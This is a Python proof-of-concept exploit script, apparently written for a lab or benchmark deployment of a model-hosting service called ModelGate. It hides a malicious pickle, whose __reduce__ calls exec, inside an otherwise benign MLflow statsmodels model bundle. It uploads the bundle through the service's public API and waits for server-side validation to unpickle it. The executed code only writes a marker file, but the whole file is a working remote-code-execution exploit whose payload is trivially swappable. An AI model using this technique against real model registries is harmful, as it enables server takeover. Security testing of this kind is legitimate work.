"""Safe external RCE proof using only the public ModelGate API."""

from __future__ import annotations

import argparse
import builtins
import json
import os
import pickle
import tempfile
import time
import uuid
import zipfile
from pathlib import Path

import httpx
import mlflow.statsmodels
import numpy as np
import statsmodels.api as sm

MARKER_PREFIX = "MODELGATE_RCE_PROOF"


class MarkerPayload:
    def __init__(self, proof_id: uuid.UUID):
        self.proof_id = proof_id

    def __reduce__(self):
        statement = (
            "from pathlib import Path; import os; "
            "root=Path(os.getenv('MODELGATE_RCE_PROOF_ROOT', "
            "'/var/lib/modelgate/rce-proofs')); "
            "root.mkdir(parents=True, exist_ok=True); "
            f"(root / '{self.proof_id}').write_text("
            f"'{MARKER_PREFIX}', encoding='utf-8')"
        )
        return builtins.exec, (statement,)


def create_bundle(temp_dir: Path, proof_id: uuid.UUID) -> Path:
    model_path = temp_dir / "model"
    x = sm.add_constant(np.arange(4.0))
    y = 1.0 + np.arange(4.0)
    benign_model = sm.OLS(y, x).fit()
    mlflow.statsmodels.save_model(benign_model, model_path)

    model_pickle = model_path / "model.statsmodels"
    with model_pickle.open("wb") as handle:
        pickle.dump(MarkerPayload(proof_id), handle)

    bundle = temp_dir / "rce-proof-model.zip"
    with zipfile.ZipFile(bundle, "w", zipfile.ZIP_DEFLATED) as archive:
        for path in model_path.rglob("*"):
            if path.is_file():
                archive.write(path, Path("model") / path.relative_to(model_path))
    return bundle


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--timeout", type=float, default=30.0, help="Seconds to wait for validation"
    )
    args = parser.parse_args()

    proof_id = uuid.uuid4()
    modelgate_url = os.getenv(
        "POC_MODELGATE_URL", "http://127.0.0.1:8080"
    ).rstrip("/")
    model_name = f"safe-rce-proof-{int(time.time())}"

    with tempfile.TemporaryDirectory(prefix="modelgate-rce-") as temp_dir:
        bundle = create_bundle(Path(temp_dir), proof_id)
        with httpx.Client(timeout=60.0) as client:
            upload = client.post(
                f"{modelgate_url}/api/artifacts",
                content=bundle.read_bytes(),
                headers={"content-type": "application/zip"},
            )
            upload.raise_for_status()
            uploaded = upload.json()

            create = client.post(
                f"{modelgate_url}/api/models",
                json={
                    "name": model_name,
                    "artifact_uri": uploaded["artifact_uri"],
                    "description": "Synthetic marker-only external RCE verification",
                },
            )
            create.raise_for_status()
            job = create.json()["validation_job"]
            deadline = time.monotonic() + args.timeout
            while job["status"] not in {"succeeded", "failed"}:
                if time.monotonic() >= deadline:
                    raise TimeoutError(
                        "Validation job did not finish before the timeout"
                    )
                time.sleep(0.5)
                response = client.get(f"{modelgate_url}/api/jobs/{job['id']}")
                response.raise_for_status()
                job = response.json()

            if job["status"] != "succeeded":
                raise RuntimeError(f"Validation failed: {job.get('error')}")

            proof = client.get(f"{modelgate_url}/api/proofs/rce/{proof_id}")
            proof.raise_for_status()
            proof_result = proof.json()

    print(
        json.dumps(
            {
                "proof": "rce",
                "success": True,
                "proof_id": str(proof_id),
                "upload_id": uploaded["upload_id"],
                "artifact_uri": uploaded["artifact_uri"],
                "model_name": model_name,
                "model_version": "1",
                "validation_job": job["id"],
                "validation_status": job["status"],
                "evidence": proof_result["evidence"],
            },
            ensure_ascii=False,
        )
    )


if __name__ == "__main__":
    main()
